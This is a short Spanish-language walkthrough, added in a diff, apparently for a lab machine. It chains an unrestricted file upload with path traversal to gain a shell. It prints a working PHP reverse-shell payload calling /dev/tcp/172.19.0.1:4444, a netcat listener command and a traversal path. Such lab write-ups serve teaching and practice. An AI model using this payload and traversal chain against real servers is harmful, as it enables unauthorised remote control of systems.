@@ -1,0 +1,18 @@
+	Esté equipo cuenta con dos vulnerabilidades diferentes, Path Traversal (Transversal de Directorios), la cual
+	permite a un atacante acceder a archivos fuera del directorio raíz de la aplicación y Subida de Archivos Sin 
+	Restricciones, que permite a un atacante subir archivos maliciosos que pueden ser ejecutados en el servidor.
+	Para lanzar una shell remota en esta máquina explotaremos ambas vulneravilidades.
+
+	Empezaremos creando un archivo en php que ejecute la shell reversa y lo subiremos al servidor a traves del 
+	segundo formulario:
+
+	<?php
+	exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/172.19.0.1/4444 0>&1'");
+	?>
+
+	Después, pondrémos a el puerto especificado en escucha y añadiremos la ruta donde se ha subido ese archivo
+	al primer formulario, escapando de la ruta normal:
+
+	nc -lnvp 4444
+
+	../../../../../../../home/etzio/index.html
